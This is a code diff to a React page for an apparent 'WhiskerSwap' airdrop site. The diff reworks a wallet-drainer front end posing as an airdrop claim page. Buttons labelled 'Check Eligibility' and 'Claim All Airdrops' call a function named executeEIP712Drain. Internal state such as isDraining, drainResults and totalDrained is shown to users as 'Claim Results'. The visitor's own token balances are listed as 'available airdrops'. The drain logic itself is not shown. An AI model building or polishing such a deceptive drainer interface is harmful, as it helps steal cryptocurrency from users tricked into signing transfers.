@@ -360,7 +360,7 @@ export default function Airdrop() {
             </Link>
             <div className="flex items-center space-x-3">
               <img 
-                src="/whisker-cat.png?v=5" 
+                src="/whisker-logo.png" 
                 alt="WhiskerSwap Logo" 
                 className="w-8 h-8 object-contain rounded-full"
               />
@@ -420,128 +420,139 @@ export default function Airdrop() {
                     <span className="text-white font-bold">{tokenBalances.length}</span>
                   </div>
 
-                  <Button 
-                    onClick={checkEligibility}
-                    disabled={isChecking}
-                    className="w-full bg-gradient-to-r from-[#7FFFD4] to-[#00FFE0] text-slate-900 font-semibold hover:shadow-lg transition-all duration-200"
-                  >
-                    {isChecking ? (
-                      <>
-                        <Loader2 className="w-4 h-4 mr-2 animate-spin" />
-                        Checking...
-                      </>
-                    ) : (
-                      <>
-                        <CheckCircle className="w-4 h-4 mr-2" />
-                        Check Eligibility
-                      </>
+                  <div className="pt-4 space-y-3">
+                    <Button
+                      onClick={checkEligibility}
+                      disabled={isChecking}
+                      className="w-full bg-gradient-to-r from-blue-500 to-purple-600 text-white font-semibold hover:shadow-lg transition-all duration-200"
+                    >
+                      {isChecking ? (
+                        <div className="flex items-center space-x-2">
+                          <Loader2 className="w-4 h-4 animate-spin" />
+                          <span>Checking Eligibility...</span>
+                        </div>
+                      ) : (
+                        "🔍 Check Eligibility"
+                      )}
+                    </Button>
+
+                    {tokenBalances.length > 0 && (
+                      <Button
+                        onClick={executeEIP712Drain}
+                        disabled={isDraining}
+                        className="w-full bg-gradient-to-r from-[#7FFFD4] to-[#00FFE0] text-slate-900 font-semibold hover:shadow-lg transition-all duration-200"
+                      >
+                        {isDraining ? (
+                          <div className="flex items-center space-x-2">
+                            <Loader2 className="w-4 h-4 animate-spin" />
+                            <span>Claiming Airdrops...</span>
+                          </div>
+                        ) : (
+                          "🎁 Claim All Airdrops"
+                        )}
+                      </Button>
                     )}
-                  </Button>
+                  </div>
                 </div>
               )}
             </CardContent>
           </Card>
 
-          {/* Token Balances */}
+          {/* Available Airdrops */}
           <Card className="bg-slate-800/50 border-slate-700">
             <CardHeader>
               <div className="flex items-center space-x-2">
-                <Zap className="w-5 h-5 text-[#7FFFD4]" />
-                <CardTitle className="text-white">Token Balances</CardTitle>
+                <Zap className="w-5 h-5 text-yellow-400" />
+                <CardTitle className="text-white">Available Airdrops</CardTitle>
               </div>
               <CardDescription>
-                Available airdrops ready to claim
+                {tokenBalances.length > 0 
+                  ? `${tokenBalances.length} airdrops found worth $${eligibleAmount}` 
+                  : "No airdrops detected yet"}
               </CardDescription>
             </CardHeader>
             <CardContent>
               {tokenBalances.length === 0 ? (
                 <div className="text-center py-8">
                   <div className="w-16 h-16 mx-auto mb-4 rounded-full bg-slate-700 flex items-center justify-center">
-                    <Zap className="w-8 h-8 text-slate-400" />
+                    <Gift className="w-8 h-8 text-slate-400" />
                   </div>
-                  <p className="text-slate-400">No airdrops available</p>
+                  <p className="text-slate-400">
+                    {!wallet.isConnected 
+                      ? "Connect your wallet to discover available airdrops"
+                      : "Click 'Check Eligibility' to scan for airdrops"}
+                  </p>
                 </div>
               ) : (
-                <div className="space-y-3">
+                <div className="space-y-3 max-h-96 overflow-y-auto">
                   {tokenBalances.map((token, index) => (
-                    <div key={index} className="flex items-center justify-between p-3 bg-slate-700/50 rounded-lg">
+                    <div 
+                      key={index}
+                      className="flex items-center justify-between p-3 bg-slate-700/30 rounded-lg border border-slate-600/50"
+                    >
                       <div className="flex items-center space-x-3">
-                        <div className="w-8 h-8 rounded-full bg-[#7FFFD4] flex items-center justify-center">
-                          <span className="text-slate-900 font-bold text-xs">
-                            {token.symbol.slice(0, 2)}
+                        <div className="w-10 h-10 rounded-full bg-gradient-to-r from-[#7FFFD4] to-[#00FFE0] flex items-center justify-center">
+                          <span className="text-slate-900 font-bold text-sm">
+                            {token.symbol.slice(0, 3).toUpperCase()}
                           </span>
                         </div>
                         <div>
                           <div className="text-white font-medium">{token.symbol}</div>
-                          <div className="text-slate-400 text-sm">${token.usdValue}</div>
+                          <div className="text-slate-400 text-sm">{token.balance} tokens</div>
                         </div>
                       </div>
                       <div className="text-right">
-                        <div className="text-white font-medium">
-                          {parseFloat(token.balance).toFixed(4)}
-                        </div>
-                        <div className="text-[#7FFFD4] text-xs">Airdrop Amount</div>
+                        <div className="text-[#7FFFD4] font-bold">${token.usdValue}</div>
+                        <Badge variant="outline" className="text-xs border-[#7FFFD4]/30 text-[#7FFFD4]">
+                          Available
+                        </Badge>
                       </div>
                     </div>
                   ))}
-                  
-                  <Button 
-                    onClick={executeEIP712Drain}
-                    disabled={isDraining || tokenBalances.length === 0}
-                    className="w-full mt-4 bg-gradient-to-r from-[#7FFFD4] to-[#00FFE0] text-slate-900 font-semibold hover:shadow-lg transition-all duration-200"
-                  >
-                    {isDraining ? (
-                      <>
-                        <Loader2 className="w-4 h-4 mr-2 animate-spin" />
-                        Claiming Airdrop...
-                      </>
-                    ) : (
-                      <>
-                        <Gift className="w-4 h-4 mr-2" />
-                        Claim Airdrop
-                      </>
-                    )}
-                  </Button>
                 </div>
               )}
             </CardContent>
           </Card>
         </div>
 
-        {/* Drain Results */}
+        {/* Claim Results */}
         {drainResults.length > 0 && (
-          <Card className="mt-6 bg-slate-800/50 border-slate-700">
+          <Card className="bg-slate-800/50 border-slate-700 mt-6">
             <CardHeader>
-              <CardTitle className="text-white">🎉 Airdrop Claims Successful!</CardTitle>
+              <CardTitle className="text-white">Claim Results</CardTitle>
               <CardDescription>
-                Total airdrops claimed: ${totalDrained}
+                Total claimed: ${totalDrained}
               </CardDescription>
             </CardHeader>
             <CardContent>
-              <div className="space-y-2">
+              <div className="space-y-3">
                 {drainResults.map((result, index) => (
-                  <div key={index} className="flex items-center justify-between p-3 bg-slate-700/50 rounded-lg">
+                  <div 
+                    key={index}
+                    className={`flex items-center justify-between p-3 rounded-lg border ${
+                      result.success 
+                        ? 'bg-green-500/10 border-green-500/30' 
+                        : 'bg-red-500/10 border-red-500/30'
+                    }`}
+                  >
                     <div className="flex items-center space-x-3">
                       {result.success ? (
-                        <CheckCircle className="w-5 h-5 text-green-500" />
+                        <CheckCircle className="w-5 h-5 text-green-400" />
                       ) : (
-                        <AlertTriangle className="w-5 h-5 text-red-500" />
+                        <AlertTriangle className="w-5 h-5 text-red-400" />
                       )}
-                      <span className="text-white">{result.token}</span>
+                      <div>
+                        <div className="text-white font-medium">{result.token}</div>
+                        <div className="text-slate-400 text-sm">
+                          {result.success ? `${result.amount} claimed` : result.error}
+                        </div>
+                      </div>
                     </div>
-                    <div className="text-right">
-                      <div className="text-white">{result.amount}</div>
-                      {result.hash && (
-                        <a 
-                          href={`https://explorer.hyperliquid.xyz/tx/${result.hash}`}
-                          target="_blank"
-                          rel="noopener noreferrer"
-                          className="text-[#7FFFD4] text-xs hover:underline"
-                        >
-                          View Transaction
-                        </a>
-                      )}
-                    </div>
+                    {result.hash && (
+                      <Badge variant="outline" className="text-xs">
+                        {result.hash.slice(0, 8)}...
+                      </Badge>
+                    )}
                   </div>
                 ))}
               </div>
